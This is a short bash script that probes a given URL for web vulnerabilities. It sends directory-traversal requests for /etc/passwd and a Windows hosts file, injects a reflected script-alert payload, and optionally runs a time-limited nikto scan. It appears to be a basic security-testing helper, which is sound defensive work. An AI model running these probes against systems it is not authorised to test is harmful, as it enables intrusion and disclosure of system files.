URL=$1
if [ -z "$URL" ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

echo "[$(date)] Starting web exploit checks for $URL"


echo "Testing directory traversal..."
curl -s -k --max-time 5 "$URL/../../etc/passwd" | head -5
curl -s -k --max-time 5 "$URL/../../../windows/system32/drivers/etc/hosts" | head -5

echo "Testing XSS..."
curl -s -k --max-time 5 "$URL?test=<script>alert('XSS')</script>" | grep -i script


if command -v nikto &> /dev/null; then
    echo "Running limited nikto scan..."
    nikto -host "$URL" -timeout 10 -maxtime 30s -Format txt | head -20
fi

echo "[$(date)] Web exploit checks completed for $URL"
